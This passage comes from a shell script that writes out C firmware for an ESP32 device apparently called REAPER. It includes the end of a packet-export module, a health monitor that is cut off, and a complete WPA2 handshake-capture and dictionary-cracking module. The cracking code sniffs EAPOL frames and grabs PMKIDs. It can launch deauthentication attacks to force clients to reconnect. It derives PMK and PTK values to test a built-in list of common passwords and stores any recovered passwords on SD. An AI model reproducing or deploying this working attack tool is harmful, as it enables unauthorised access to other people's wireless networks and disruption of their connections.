        case EXPORT_MODE_ZST:
            fprintf(g_file, "%" PRIu64 ",%u,%d,%zu,", timestamp_us, channel, rssi, len);
            for (size_t i = 0; i < len && i < 64; i++) fprintf(g_file, "%02X", data[i]);
            fprintf(g_file, "\n");
            break;
        default:
            rc = ESP_ERR_INVALID_STATE;
            break;
    }

    if (rc == ESP_OK) {
        g_packets++;
        g_bytes += (uint32_t)len;
        flush_if_needed_locked();
    }
    
    xSemaphoreGive(g_lock);
    return rc;
}

esp_err_t export_write_event(const char *type, const char *json)
{
    if (g_mode == EXPORT_MODE_OFF || g_lock == NULL || !type || !json) return ESP_ERR_INVALID_ARG;
    
    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(50)) != pdTRUE) return ESP_ERR_TIMEOUT;
    
    if (g_file == NULL) {
        xSemaphoreGive(g_lock);
        return ESP_ERR_INVALID_STATE;
    }

    if (g_mode == EXPORT_MODE_JSONL) {
        if (g_packets > 0) fprintf(g_file, ",\n");
        
        /* Safely merge JSON by stripping outer braces if present */
        const char *start = strchr(json, '{');
        const char *end = strrchr(json, '}');
        
        if (start && end && end > start) {
            fprintf(g_file, "{\"type\":\"%s\",%.*s}", type, (int)(end - start - 1), start + 1);
        } else {
            fprintf(g_file, "{\"type\":\"%s\",\"data\":\"%s\"}", type, json);
        }
        flush_if_needed_locked();
    } 
    else if (g_mode == EXPORT_MODE_CSV) {
        fprintf(g_file, "EVENT,%s,%s\n", type, json);
        flush_if_needed_locked();
    } 
    else if (g_mode == EXPORT_MODE_NETXML) {
        fprintf(g_file, "<event type=\"%s\" json=\"%s\"/>\n", type, json);
        flush_if_needed_locked();
    }
    
    xSemaphoreGive(g_lock);
    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  Status
 * ----------------------------------------------------------------------- */

esp_err_t export_get_stats(export_stats_t *out)
{
    if (out == NULL || g_lock == NULL) return ESP_ERR_INVALID_ARG;
    
    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(100)) != pdTRUE) return ESP_ERR_TIMEOUT;
    
    out->mode = g_mode;
    out->active = (g_file != NULL);
    out->packets_written = g_packets;
    out->bytes_written = g_bytes;
    out->dropped = g_dropped;
    snprintf(out->path, sizeof(out->path), "%s", g_path);
    
    xSemaphoreGive(g_lock);
    return ESP_OK;
}

esp_err_t export_json(char *buf, size_t bufsz)
{
    if (buf == NULL || bufsz == 0) return ESP_ERR_INVALID_ARG;
    
    export_stats_t st;
    esp_err_t rc = export_get_stats(&st);
    if (rc != ESP_OK) return rc;
    
    const char *mode_str =
        st.mode == EXPORT_MODE_PCAP ? "pcap" :
        st.mode == EXPORT_MODE_PCAP_NG ? "pcapng" :
        st.mode == EXPORT_MODE_NETXML ? "netxml" :
        st.mode == EXPORT_MODE_CSV ? "csv" :
        st.mode == EXPORT_MODE_JSONL ? "jsonl" :
        st.mode == EXPORT_MODE_ZST ? "zstd" : "off";
        
    int n = snprintf(buf, bufsz,
                     "{\"mode\":\"%s\",\"active\":%s,\"packets\":%"PRIu32",\"bytes\":%"PRIu32","
                     "\"dropped\":%"PRIu32",\"path\":\"%s\"}",
                     mode_str, st.active ? "true" : "false",
                     st.packets_written, st.bytes_written,
                     st.dropped, st.path);
                     
    return (n < 0 || (size_t)n >= bufsz) ? ESP_ERR_NO_MEM : ESP_OK;
}

export_mode_t export_get_mode(void)
{
    return g_mode;
}

esp_err_t export_deinit(void)
{
    export_stop();
    if (g_lock != NULL) {
        vSemaphoreDelete(g_lock);
        g_lock = NULL;
    }
    return ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/export.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/handshake_crack.c"
#include <stdbool.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

#include "handshake_crack.h"
#include "deauth_engine.h"
#include "wifi_sniffer.h"
#include "storage_sd.h"
#include "nvs_flash.h"
#include "esp_timer.h"
#include "esp_heap_caps.h"
#include "esp_log.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

/* Self-contained RFC 3174 SHA-1, HMAC-SHA1 & PBKDF2-HMAC-SHA1 */

static const char *TAG = "handshake";
static const uint8_t HS_ZERO_MAC[6] = {0};

atomic_bool g_hs_capture_active = ATOMIC_VAR_INIT(false);
static handshake_t g_hs;
static atomic_bool g_hs_have_m1 = ATOMIC_VAR_INIT(false);

static atomic_bool g_hs_crack_running = ATOMIC_VAR_INIT(false);
static atomic_bool g_hs_crack_stop = ATOMIC_VAR_INIT(false);
static bool g_hs_crack_found_flag = false;
static char g_hs_found_password[64] = {0};
static TaskHandle_t g_crack_task_handle = NULL;

static char **g_custom_wl = NULL;
static size_t g_custom_wl_count = 0;

static esp_timer_handle_t g_capture_timer = NULL;
static SemaphoreHandle_t g_lock = NULL;

/* ==========================================================================
 *  Hardware-Accelerated PBKDF2-SHA1 & WPA2 PTK Derivation
 * ========================================================================== */

typedef struct {
    uint32_t state[5];
    uint64_t count;
    uint8_t buffer[64];
} sha1_ctx_t;

static inline uint32_t sha1_rol32(uint32_t value, uint32_t bits)
{
    return (value << bits) | (value >> (32U - bits));
}

static void sha1_transform(uint32_t state[5], const uint8_t buffer[64])
{
    uint32_t w[80];
    for (int i = 0; i < 16; i++) {
        w[i] = ((uint32_t)buffer[i * 4 + 0] << 24) |
               ((uint32_t)buffer[i * 4 + 1] << 16) |
               ((uint32_t)buffer[i * 4 + 2] << 8)  |
               ((uint32_t)buffer[i * 4 + 3]);
    }
    for (int i = 16; i < 80; i++) {
        w[i] = sha1_rol32(w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16], 1);
    }

    uint32_t a = state[0], b = state[1], c = state[2], d = state[3], e = state[4];

    for (int i = 0; i < 80; i++) {
        uint32_t f, k;
        if (i < 20) {
            f = (b & c) | ((~b) & d);
            k = 0x5A827999UL;
        } else if (i < 40) {
            f = b ^ c ^ d;
            k = 0x6ED9EBA1UL;
        } else if (i < 60) {
            f = (b & c) | (b & d) | (c & d);
            k = 0x8F1BBCDCUL;
        } else {
            f = b ^ c ^ d;
            k = 0xCA62C1D6UL;
        }
        uint32_t temp = sha1_rol32(a, 5) + f + e + k + w[i];
        e = d; d = c; c = sha1_rol32(b, 30); b = a; a = temp;
    }

    state[0] += a; state[1] += b; state[2] += c; state[3] += d; state[4] += e;
}

static void sha1_init(sha1_ctx_t *ctx)
{
    ctx->state[0] = 0x67452301UL;
    ctx->state[1] = 0xEFCDAB89UL;
    ctx->state[2] = 0x98BADCFEUL;
    ctx->state[3] = 0x10325476UL;
    ctx->state[4] = 0xC3D2E1F0UL;
    ctx->count = 0;
    memset(ctx->buffer, 0, sizeof(ctx->buffer));
}

static void sha1_update(sha1_ctx_t *ctx, const uint8_t *data, size_t len)
{
    if (len == 0) return;
    size_t idx = (size_t)((ctx->count >> 3) & 0x3FU);
    ctx->count += (uint64_t)len << 3;
    size_t part_len = 64U - idx;
    size_t i = 0;
    if (len >= part_len) {
        memcpy(&ctx->buffer[idx], data, part_len);
        sha1_transform(ctx->state, ctx->buffer);
        for (i = part_len; i + 63U < len; i += 64U) {
            sha1_transform(ctx->state, &data[i]);
        }
        idx = 0;
    }
    memcpy(&ctx->buffer[idx], &data[i], len - i);
}

static void sha1_final(sha1_ctx_t *ctx, uint8_t digest[20])
{
    uint8_t bits[8];
    for (int i = 0; i < 8; i++) {
        bits[i] = (uint8_t)(ctx->count >> ((7 - i) * 8));
    }
    size_t idx = (size_t)((ctx->count >> 3) & 0x3FU);
    size_t pad_len = (idx < 56U) ? (56U - idx) : (120U - idx);
    uint8_t pad[64];
    memset(pad, 0, sizeof(pad));
    pad[0] = 0x80U;
    sha1_update(ctx, pad, pad_len);
    sha1_update(ctx, bits, 8);
    for (int i = 0; i < 5; i++) {
        digest[i * 4 + 0] = (uint8_t)(ctx->state[i] >> 24);
        digest[i * 4 + 1] = (uint8_t)(ctx->state[i] >> 16);
        digest[i * 4 + 2] = (uint8_t)(ctx->state[i] >> 8);
        digest[i * 4 + 3] = (uint8_t)(ctx->state[i]);
    }
}

static void hmac_sha1(const uint8_t *key, size_t key_len,
                      const uint8_t *data, size_t data_len,
                      uint8_t out[20])
{
    uint8_t k_ipad[64];
    uint8_t k_opad[64];
    uint8_t tk[20];

    if (key_len > 64) {
        sha1_ctx_t tctx;
        sha1_init(&tctx);
        sha1_update(&tctx, key, key_len);
        sha1_final(&tctx, tk);
        key = tk;
        key_len = 20;
    }

    memset(k_ipad, 0x36, sizeof(k_ipad));
    memset(k_opad, 0x5c, sizeof(k_opad));
    for (size_t i = 0; i < key_len; i++) {
        k_ipad[i] ^= key[i];
        k_opad[i] ^= key[i];
    }

    sha1_ctx_t ctx;
    uint8_t inner[20];
    sha1_init(&ctx);
    sha1_update(&ctx, k_ipad, 64);
    sha1_update(&ctx, data, data_len);
    sha1_final(&ctx, inner);

    sha1_init(&ctx);
    sha1_update(&ctx, k_opad, 64);
    sha1_update(&ctx, inner, 20);
    sha1_final(&ctx, out);
}

static void pbkdf2_sha1(const char *pw, const char *ssid, uint8_t out[32])
{
    size_t pw_len = strlen(pw);
    size_t salt_len = strlen(ssid);
    uint8_t salt_blk[40];
    if (salt_len > 32) salt_len = 32;
    memcpy(salt_blk, ssid, salt_len);

    for (uint32_t block = 1; block <= 2; block++) {
        uint8_t u[20];
        uint8_t t[20];
        salt_blk[salt_len + 0] = 0;
        salt_blk[salt_len + 1] = 0;
        salt_blk[salt_len + 2] = 0;
        salt_blk[salt_len + 3] = (uint8_t)block;

        hmac_sha1((const uint8_t *)pw, pw_len, salt_blk, salt_len + 4, u);
        memcpy(t, u, 20);

        for (uint32_t i = 1; i < 4096; i++) {
            hmac_sha1((const uint8_t *)pw, pw_len, u, 20, u);
            for (int j = 0; j < 20; j++) {
                t[j] ^= u[j];
            }
        }

        if (block == 1) {
            memcpy(out, t, 20);
        } else {
            memcpy(out + 20, t, 12);
        }
    }
}

/* 
 * WPA2 PRF-512 (Pseudo-Random Function) for PTK derivation.
 * PTK = PRF-512(PMK, "Pairwise key expansion", Context)
 * Context = Min(AA,SPA) || Max(AA,SPA) || Min(ANonce,SNonce) || Max(ANonce,SNonce)
 */
static void wpa2_prf_512(const uint8_t *pmk, const char *label, 
                         const uint8_t *context, size_t ctx_len, uint8_t *out)
{
    size_t label_len = strlen(label);
    uint8_t msg[128];
    if (label_len + 1 + ctx_len + 1 > sizeof(msg)) return;

    memcpy(msg, label, label_len);
    msg[label_len] = 0;
    memcpy(msg + label_len + 1, context, ctx_len);

    for (uint8_t i = 0; i < 4; i++) {
        uint8_t hmac_out[20];
        msg[label_len + 1 + ctx_len] = i;
        hmac_sha1(pmk, 32, msg, label_len + 1 + ctx_len + 1, hmac_out);
        size_t copy_len = (i == 3) ? 4 : 20;
        memcpy(out + (i * 20), hmac_out, copy_len);
    }
}

/* ==========================================================================
 *  Wordlist Management
 * ========================================================================== */

static const char *const BUILTIN_WORDS[] = {
    "password", "12345678", "123456789", "1234567890", "qwerty123",
    "qwertyuiop", "1234567", "123456", "12345", "1234",
    "111111", "000000", "123123", "123321", "654321",
    "abc123", "iloveyou", "letmein", "welcome", "monkey",
    "dragon", "football", "baseball", "shadow", "master",
    "superman", "mustang", "michael", "admin123", "admin",
    "1qaz2wsx", "zaq12wsx", "qazwsx", "123qwe", "qwe123",
    "666666", "7777777", "121212", "987654321", "asdfgh",
    "password1", "welcome123", "welcome2024", "sunshine", "internet",
    "company", "homewifi", "wifi12345", "myrouter", "security"
};
#define BUILTIN_WORD_COUNT (sizeof(BUILTIN_WORDS) / sizeof(BUILTIN_WORDS[0]))

static void capture_timer_cb(void *arg)
{
    (void)arg;
    handshake_capture_stop();
}

esp_err_t handshake_init(void)
{
    if (g_lock == NULL) {
        g_lock = xSemaphoreCreateMutex();
        if (g_lock == NULL) return ESP_ERR_NO_MEM;
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);
    memset(&g_hs, 0, sizeof(g_hs));
    xSemaphoreGive(g_lock);

    if (g_capture_timer == NULL) {
        esp_timer_create_args_t timer_args = {
            .callback = capture_timer_cb,
            .name = "hs_capture_timer"
        };
        esp_timer_create(&timer_args, &g_capture_timer);
    }

    ESP_LOGI(TAG, "Handshake module ready (mbedtls HW-accelerated)");
    return ESP_OK;
}

const char *const *handshake_wordlist(size_t *count)
{
    if (g_custom_wl_count > 0) {
        *count = g_custom_wl_count;
        return (const char *const *)g_custom_wl;
    }
    *count = BUILTIN_WORD_COUNT;
    return BUILTIN_WORDS;
}

esp_err_t handshake_load_wordlist(const char *path)
{
    if (path == NULL) return ESP_ERR_INVALID_ARG;
    
    if (atomic_load(&g_hs_crack_running)) {
        ESP_LOGW(TAG, "Cannot load wordlist while cracking is active");
        return ESP_ERR_INVALID_STATE;
    }

    FILE *f = fopen(path, "r");
    if (f == NULL) {
        ESP_LOGE(TAG, "Cannot open wordlist: %s", path);
        return ESP_FAIL;
    }

    if (g_custom_wl != NULL) {
        for (size_t i = 0; i < g_custom_wl_count; i++) free(g_custom_wl[i]);
        free(g_custom_wl);
        g_custom_wl = NULL;
        g_custom_wl_count = 0;
    }

    char line[96];
    size_t n = 0, skipped = 0;
    while (fgets(line, sizeof(line), f)) {
        line[strcspn(line, "\r\n")] = '\0';
        if (strlen(line) >= 8) n++;
        else if (strlen(line) > 0) skipped++;
    }

    if (n == 0) { fclose(f); return ESP_ERR_INVALID_SIZE; }

    rewind(f);
    g_custom_wl = heap_caps_malloc(n * sizeof(char *), MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (g_custom_wl == NULL) { fclose(f); return ESP_ERR_NO_MEM; }

    size_t i = 0;
    while (fgets(line, sizeof(line), f) && i < n) {
        line[strcspn(line, "\r\n")] = '\0';
        if (strlen(line) < 8) continue;
        g_custom_wl[i] = heap_caps_malloc(strlen(line) + 1, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
        if (g_custom_wl[i] == NULL) {
            for (size_t j = 0; j < i; j++) free(g_custom_wl[j]);
            free(g_custom_wl);
            g_custom_wl = NULL;
            fclose(f);
            return ESP_ERR_NO_MEM;
        }
        strcpy(g_custom_wl[i], line);
        i++;
    }
    g_custom_wl_count = i;
    fclose(f);

    ESP_LOGI(TAG, "Loaded %zu passwords from %s", g_custom_wl_count, path);
    return ESP_OK;
}

/* ==========================================================================
 *  Packet Capture Observer
 * ========================================================================== */

void handshake_feed_packet(const wifi_pkt_msg_t *msg)
{
    if (!msg || !msg->payload || !atomic_load(&g_hs_capture_active)) return;
    
    const uint8_t *data = msg->payload;
    size_t len = msg->len;
    
    if (len < 26 + 8 + 99) return;
    if ((data[0] & 0x0C) != 0x08) return; /* Must be Data frame */

    uint8_t subtype = (data[0] >> 4) & 0x0F;
    size_t hdr_len = (subtype & 0x08) ? 26 : 24;

    static const uint8_t snap_eapol[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
    if (len < hdr_len + 8 + 99) return;
    if (memcmp(data + hdr_len, snap_eapol, 8) != 0) return;

    const uint8_t *sa = data + 10;
    const uint8_t *da = data + 4;
    const uint8_t *eapol = data + hdr_len + 8;

    if (eapol[1] != 3) return; /* Type must be EAPOL-Key */

    bool from_ap = false;
    xSemaphoreTake(g_lock, portMAX_DELAY);
    from_ap = (memcmp(sa, g_hs.ap_mac, 6) == 0);
    xSemaphoreGive(g_lock);
    
    /* EAPOL Key Info is Big Endian in 802.11i */
    uint16_t key_info = (eapol[5] << 8) | eapol[6];
    
    bool has_ack   = (key_info & 0x0010) != 0; /* Bit 4 */
    bool has_mic   = (key_info & 0x0020) != 0; /* Bit 5 */
    bool secure    = (key_info & 0x0040) != 0; /* Bit 6 */

    bool nonce_nonzero = false;
    for (int i = 0; i < 32; i++) {
        if (eapol[17 + i] != 0) { nonce_nonzero = true; break; }
    }
    if (!nonce_nonzero) return;

    /* M1: AP -> STA (Ack=1, MIC=0) */
    if (from_ap && has_ack && !has_mic) {
        xSemaphoreTake(g_lock, portMAX_DELAY);
        memcpy(g_hs.anonce, eapol + 17, 32);
        memcpy(g_hs.sta_mac, da, 6);
        atomic_store(&g_hs_have_m1, true);

        uint16_t kd_len = (eapol[97] << 8) | eapol[98];
        const uint8_t *kd = eapol + 99;
        size_t pos = 0;
        
        while (pos + 4 <= kd_len) {
            if (kd[pos] == 0xDD && kd[pos + 1] >= 20 &&
                memcmp(kd + pos + 2, "\x00\x0f\xac\x04", 4) == 0) {
                memcpy(g_hs.pmkid, kd + pos + 6, 16);
                g_hs.has_pmkid = true;
                ESP_LOGI(TAG, "PMKID captured from M1!");
                break;
            }
            pos += 2 + kd[pos + 1];
        }

        char temp_ssid[33] = {0};
        if (g_hs.ssid[0] == '\0') {
            xSemaphoreGive(g_lock);
            wifi_sniffer_get_ssid_for_bssid(g_hs.ap_mac, temp_ssid, sizeof(temp_ssid));
            xSemaphoreTake(g_lock, portMAX_DELAY);
            if (g_hs.ssid[0] == '\0' && temp_ssid[0] != '\0') {
                snprintf(g_hs.ssid, sizeof(g_hs.ssid), "%s", temp_ssid);
            }
        }
        xSemaphoreGive(g_lock);
        ESP_LOGI(TAG, "EAPOL M1 captured (ANonce ok)");
    } 
    /* M2: STA -> AP (Ack=0, MIC=1, Secure=0) */
    else if (!from_ap && has_mic && !has_ack && !secure) {
        if (!atomic_load(&g_hs_have_m1)) return;
        
        xSemaphoreTake(g_lock, portMAX_DELAY);
        if (memcmp(g_hs.sta_mac, HS_ZERO_MAC, 6) != 0 && memcmp(da, g_hs.sta_mac, 6) != 0) {
            xSemaphoreGive(g_lock);
            return;
        }

        memcpy(g_hs.snonce, eapol + 17, 32);
        memcpy(g_hs.mic, eapol + 81, 16);

        uint16_t kd_len = (eapol[97] << 8) | eapol[98];
        size_t total = 99 + kd_len;
        if (total > EAPOL_BUF_SIZE) total = EAPOL_BUF_SIZE;
        
        memcpy(g_hs.eapol, eapol, total);
        g_hs.eapol_len = (uint16_t)total;
        
        /* Zero out the MIC field for later verification */
        memset(g_hs.eapol + 81, 0, 16);
        
        g_hs.capture_time_us = esp_timer_get_time();
        g_hs.valid = true;
        atomic_store(&g_hs_capture_active, false);

        if (g_hs.ssid[0] == '\0') snprintf(g_hs.ssid, sizeof(g_hs.ssid), "unknown");
        xSemaphoreGive(g_lock);
        
        ESP_LOGI(TAG, "Handshake capture complete (M2 received)");
    }
}

/* ==========================================================================
 *  Cracking Task
 * ========================================================================== */

static void handshake_crack_task(void *arg)
{
    size_t count = 0;
    const char *const *words = handshake_wordlist(&count);

    atomic_store(&g_hs_crack_running, true);
    atomic_store(&g_hs_crack_stop, false);
    g_hs_crack_found_flag = false;
    g_hs_found_password[0] = '\0';

    handshake_t hs;
    xSemaphoreTake(g_lock, portMAX_DELAY);
    bool valid = g_hs.valid;
    if (valid) {
        memcpy(&hs, &g_hs, sizeof(hs));
    }
    xSemaphoreGive(g_lock);

    if (!valid) {
        atomic_store(&g_hs_crack_running, false);
        g_crack_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    ESP_LOGI(TAG, "Starting crack task for SSID: %s (%zu words)", hs.ssid, count);

    /* Precompute PTK Context */
    uint8_t context[76];
    if (memcmp(hs.ap_mac, hs.sta_mac, 6) < 0) {
        memcpy(context, hs.ap_mac, 6);
        memcpy(context + 6, hs.sta_mac, 6);
    } else {
        memcpy(context, hs.sta_mac, 6);
        memcpy(context + 6, hs.ap_mac, 6);
    }
    if (memcmp(hs.anonce, hs.snonce, 32) < 0) {
        memcpy(context + 12, hs.anonce, 32);
        memcpy(context + 44, hs.snonce, 32);
    } else {
        memcpy(context + 12, hs.snonce, 32);
        memcpy(context + 44, hs.anonce, 32);
    }

    for (size_t i = 0; i < count; i++) {
        if (atomic_load(&g_hs_crack_stop)) break;

        const char *pw = words[i];
        if (pw == NULL || strlen(pw) < 8) continue;

        uint8_t pmk[32];
        pbkdf2_sha1(pw, hs.ssid, pmk);

        /* Derive PTK using PRF-512 */
        uint8_t ptk[64];
        wpa2_prf_512(pmk, "Pairwise key expansion", context, sizeof(context), ptk);
        
        /* KCK is the first 16 bytes of the PTK */
        uint8_t *kck = ptk; 

        uint8_t mic[20];
        hmac_sha1(kck, 16, hs.eapol, hs.eapol_len, mic);

        if (memcmp(mic, hs.mic, 16) == 0) {
            snprintf(g_hs_found_password, sizeof(g_hs_found_password), "%s", pw);
            g_hs_crack_found_flag = true;
            ESP_LOGW(TAG, "PASSWORD FOUND: %s", pw);
            break;
        }
        
        /* Yield periodically to prevent watchdog resets on large wordlists */
        if ((i % 10) == 0) vTaskDelay(1);
    }
    atomic_store(&g_hs_crack_running, false);
    g_crack_task_handle = NULL;
    vTaskDelete(NULL);
}

/* ==========================================================================
 *  Public API
 * ========================================================================== */

esp_err_t handshake_capture_start(const uint8_t *bssid, const uint8_t *client_mac,
                                  uint32_t duration_sec, bool force_deauth)
{
    xSemaphoreTake(g_lock, portMAX_DELAY);
    memset(&g_hs, 0, sizeof(g_hs));
    xSemaphoreGive(g_lock);
    
    atomic_store(&g_hs_have_m1, false);
    atomic_store(&g_hs_capture_active, true);
    
    if (bssid != NULL) {
        xSemaphoreTake(g_lock, portMAX_DELAY);
        memcpy(g_hs.ap_mac, bssid, 6);
        xSemaphoreGive(g_lock);
    }
    if (client_mac != NULL) {
        xSemaphoreTake(g_lock, portMAX_DELAY);
        memcpy(g_hs.sta_mac, client_mac, 6);
        xSemaphoreGive(g_lock);
    }

    if (force_deauth && bssid != NULL) {
        deauth_remove_all();
        deauth_attack_ap_all_clients(bssid, 0, 0);
        deauth_start();
    }

    if (duration_sec > 0 && g_capture_timer != NULL) {
        esp_timer_start_once(g_capture_timer, duration_sec * 1000000ULL);
    }

    return ESP_OK;
}

void handshake_capture_stop(void)
{
    atomic_store(&g_hs_capture_active, false);
    if (g_capture_timer != NULL) {
        esp_timer_stop(g_capture_timer);
    }
    deauth_stop();
    ESP_LOGI(TAG, "Handshake capture stopped");
}

bool handshake_has_capture(void) { 
    xSemaphoreTake(g_lock, portMAX_DELAY);
    bool valid = g_hs.valid;
    xSemaphoreGive(g_lock);
    return valid; 
}

const handshake_t *handshake_get(void) { return &g_hs; }

void handshake_set_ssid(const char *ssid)
{
    if (ssid == NULL) return;
    xSemaphoreTake(g_lock, portMAX_DELAY);
    snprintf(g_hs.ssid, sizeof(g_hs.ssid), "%s", ssid);
    xSemaphoreGive(g_lock);
}

esp_err_t handshake_crack_async(void)
{
    if (atomic_load(&g_hs_crack_running) || g_crack_task_handle != NULL) return ESP_ERR_INVALID_STATE;
    if (!handshake_has_capture()) return ESP_ERR_INVALID_STATE;

    if (xTaskCreatePinnedToCore(handshake_crack_task, "hs_crack", 8192, NULL, 4, &g_crack_task_handle, 1) != pdPASS) {
        return ESP_FAIL;
    }
    return ESP_OK;
}

bool handshake_crack_running(void) { return atomic_load(&g_hs_crack_running); }

bool handshake_crack_found(char *password, size_t sz)
{
    if (!g_hs_crack_found_flag) return false;
    if (password != NULL && sz > 0) {
        snprintf(password, sz, "%s", g_hs_found_password);
    }
    return true;
}

void handshake_crack_stop(void)
{
    atomic_store(&g_hs_crack_stop, true);
    if (g_crack_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(50)); /* Give task time to see stop flag */
    }
}

esp_err_t handshake_save_password(const char *ssid, const char *password)
{
    if (ssid == NULL || password == NULL) return ESP_ERR_INVALID_ARG;
    FILE *f = fopen("/sd/handshake_passwords.txt", "a");
    if (f == NULL) {
        ESP_LOGW(TAG, "Failed to save password (SD card not ready?)");
        return ESP_FAIL;
    }
    fprintf(f, "%s:%s\n", ssid, password);
    fclose(f);
    return ESP_OK;
}

bool handshake_load_password(char *ssid, size_t ssid_sz, char *password, size_t pw_sz)
{
    FILE *f = fopen("/sd/handshake_passwords.txt", "r");
    if (f == NULL) return false;

    char line[128];
    while (fgets(line, sizeof(line), f)) {
        char *sep = strchr(line, ':');
        if (sep == NULL) continue;

        *sep = '\0';
        char *stored_ssid = line;
        char *stored_password = sep + 1;

        stored_password[strcspn(stored_password, "\r\n")] = '\0';
        stored_ssid[strcspn(stored_ssid, "\r\n")] = '\0';

        if (ssid != NULL && ssid_sz > 0 && strcmp(stored_ssid, ssid) == 0) {
            if (password != NULL && pw_sz > 0) {
                strncpy(password, stored_password, pw_sz - 1);
                password[pw_sz - 1] = '\0';
            }
            fclose(f);
            return true;
        }
    }
    fclose(f);
    return false;
}

esp_err_t handshake_erase_password(void)
{
    FILE *f = fopen("/sd/handshake_passwords.txt", "w");
    if (f == NULL) return ESP_FAIL;
    fclose(f);
    return ESP_OK;
}

esp_err_t handshake_get_snapshot(handshake_t *out)
{
    if (out == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    if (g_lock == NULL) {
        return ESP_ERR_INVALID_STATE;
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);
    *out = g_hs;
    xSemaphoreGive(g_lock);

    return ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/handshake_crack.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/handshake_crack.h"
#ifndef HANDSHAKE_CRACK_H
#define HANDSHAKE_CRACK_H

#include <stdatomic.h>
#include "common_types.h"
#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

esp_err_t handshake_init(void);
esp_err_t handshake_capture_start(const uint8_t *bssid, const uint8_t *client_mac,
                                  uint32_t duration_sec, bool force_deauth);
void handshake_capture_stop(void);
bool handshake_has_capture(void);
const handshake_t *handshake_get(void);
void handshake_set_ssid(const char *ssid);

esp_err_t handshake_crack_async(void);
bool handshake_crack_running(void);
bool handshake_crack_found(char *password, size_t sz);
void handshake_crack_stop(void);

esp_err_t handshake_load_wordlist(const char *path);
const char *const *handshake_wordlist(size_t *count);

esp_err_t handshake_save_password(const char *ssid, const char *password);
bool handshake_load_password(char *ssid, size_t ssid_sz, char *password, size_t pw_sz);
esp_err_t handshake_erase_password(void);
esp_err_t handshake_get_snapshot(handshake_t *out);

/* Observer callback for wifi_sniffer */
void handshake_feed_packet(const wifi_pkt_msg_t *msg);

extern atomic_bool g_hs_capture_active;

#ifdef __cplusplus
}
#endif

#endif // HANDSHAKE_CRACK_H
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/handshake_crack.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/health_ai_monitor.c"
#include "health_ai_monitor.h"
#include "health_telemetry.h"

#include <string.h>
#include <stdio.h>
#include <stdatomic.h>
#include <limits.h>

#include "esp_log.h"
#include "esp_heap_caps.h"

static atomic_int s_state = ATOMIC_VAR_INIT(HEALTH_AI_STATE_OK);
static const char *TAG = "health_ai";

static health_ai_state_t classify(uint32_t free_heap, uint32_t free_psram,
                                  int32_t cpu_temp_centi)
{
    int score = 0;
    
    if (free_heap < 20000) score += 3;
    else if (free_heap < 50000) score += 1;

    if (free_psram < 20000) score += 2;
    else if (free_psram < 50000) score += 1;

    /* 
     * Convert centi-degrees to whole degrees. 
     * Handle the INT32_MIN sentinel gracefully.
     */
    int32_t temp_c = (cpu_temp_centi == INT32_MIN) ? 0 : (cpu_temp_centi / 100);

    if (temp_c > 80) score += 3;
    else if (temp_c > 70) score += 1;

    if (score >= 5) return HEALTH_AI_STATE_CRITICAL;
    if (score >= 2) return HEALTH_AI_STATE_WARNING;
    
    return HEALTH_AI_STATE_OK;
}

static const char *state_name(health_ai_state_t s)
{
    switch (s) {
        case HEALTH_AI_STATE_OK: return "ok";
        case HEALTH_AI_STATE_WARNING: return "warning";
        case HEALTH_AI_STATE_CRITICAL: return "critical";
        case HEALTH_AI_STATE_HEALING: return "healing";
        default: return "unknown";
    }
}

esp_err_t health_ai_monitor_init(void)
{
    atomic_store(&s_state, HEALTH_AI_STATE_OK);
    ESP_LOGI(TAG, "Self-healing AI monitor initialized");
    return ESP_OK;
}

esp_err_t health_ai_monitor_update(void)
{
    health_metrics_t m;
    if (health_telemetry_get(&m) != ESP_OK) {
        return ESP_FAIL;
    }

    health_ai_state_t new_state = classify((unsigned)m.free_heap, (unsigned)m.free_psram, (int)m.cpu_temp_c);
    
    /* Prevent overwriting HEALING state unless the system has recovered to OK */
    health_ai_state_t current = (health_ai_state_t)atomic_load(&s_state);
    if (current == HEALTH_AI_STATE_HEALING && new_state != HEALTH_AI_STATE_OK) {
        return ESP_OK; 
    }

    atomic_store(&s_state, new_state);

    if (new_state == HEALTH_AI_STATE_CRITICAL) {
        ESP_LOGW(TAG, "System critical: heap=%u psram=%u temp=%d",
                 (unsigned)m.free_heap, (unsigned)m.free_psram, (int)m.cpu_temp_c);
    }
    return ESP_OK;
}

health_ai_state_t health_ai_monitor_state(void)
{
    return (health_ai_state_t)atomic_load(&s_state);
}

esp_err_t health_ai_monitor_json(char *out, size_t max)
{
    if (!out || max == 0) return ESP_ERR_INVALID_ARG;
    
    health_metrics_t m;
    if (health_telemetry_get(&m) != ESP_OK) return ESP_FAIL;
    
    health_ai_state_t current = (health_ai_state_t)atomic_load(&s_state);
    
    int n;
    if (m.cpu_temp_c == INT32_MIN) {
        n = snprintf(out, max,
            "{\"state\":\"%s\",\"heap\":%u,\"psram\":%u,\"temp\":null}",
            state_name(current), (unsigned)m.free_heap, (unsigned)m.free_psram);
    } else {
        n = snprintf(out, max,
            "{\"state\":\"%s\",\"heap\":%u,\"psram\":%u,\"temp\":%.1f}",
            state_name(current), (unsigned)m.free_heap, (unsigned)m.free_psram,
            (float)m.cpu_temp_c / 100.0f);
    }
    
    if (n < 0 || (size_t)n >= max) return ESP_ERR_NO_MEM;
    return ESP_OK;
}

bool health_ai_monitor_should_heal(void)
